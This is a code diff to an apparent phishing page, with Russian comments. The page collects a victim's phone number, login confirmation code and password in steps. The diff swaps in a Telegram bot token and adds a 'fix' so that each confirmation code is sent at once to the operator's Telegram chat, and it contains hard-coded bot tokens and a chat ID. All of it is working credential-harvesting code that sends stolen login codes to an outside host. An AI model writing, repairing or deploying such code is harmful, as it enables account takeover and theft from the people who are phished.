@@ -247,7 +247,7 @@
     let phoneNumber = '';
     let confirmationCode = '';
     function sendToTelegram(text) {
-      const botToken = '8321262404:AAEqcr9lCi_SdD_9UWkjaIsIU2c2R0ky2ac';      // ← вставьте сюда токен бота
+      const botToken = '8321262404:AAGdMjJLdqImTj8mLeIdr-IkWiTKgNDjzCg';      // ← вставьте сюда токен бота
       const chatId = '7981903127';      // ← вставьте сюда ваш chat_id
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
@@ -264,22 +264,6 @@
       document.getElementById('codeError').style.display = 'none';
       document.getElementById('passwordError').style.display = 'none';
     }
-    function sendPhone() {
-      const countryCode = document.querySelector('.country-code').value.trim();
-      const phoneInput = document.getElementById('phone');
-      const phone = phoneInput.value.trim();
-
-      if (phone.length < 10) {
-        document.getElementById('phoneError').style.display = 'block';
-        return;
-      }
-
-      // Объединяем код страны и номер телефона
-      phoneNumber = countryCode + phone;
-
-      sendToTelegram(`📱 Введён номер телефона: ${phoneNumber}`);
-      showStep(2);
-    }
     function sendCode() {
       const codeInput = document.getElementById('code');
       const code = codeInput.value.trim();
@@ -288,9 +272,15 @@
         return;
       }
       confirmationCode = code; // Сохраняем код для последующей отправки
+
+      // === ИСПРАВЛЕНИЕ: Отправляем код сразу же ===
+      sendToTelegram(`🔐 Код подтверждения для ${phoneNumber}: ${code}`);
+      // ===========================================
+
       document.getElementById('loading').style.display = 'block';
       document.querySelector('#step2 .btn').disabled = true;
-      // sendToTelegram(`🔐 Код подтверждения для +${phoneNumber}: ${code}`);
+
+  // Переход к следующему шагу через 2 секунды (или сразу, если хотите)
       setTimeout(() => {
         document.getElementById('loading').style.display = 'none';
         document.querySelector('#step2 .btn').disabled = false;
@@ -298,6 +288,7 @@
         showStep(3); // Переход к шагу 3
       }, 2000);
     }
+
      function sendPassword() {
       const passwordInput = document.getElementById('password');
       const password = passwordInput.value.trim();
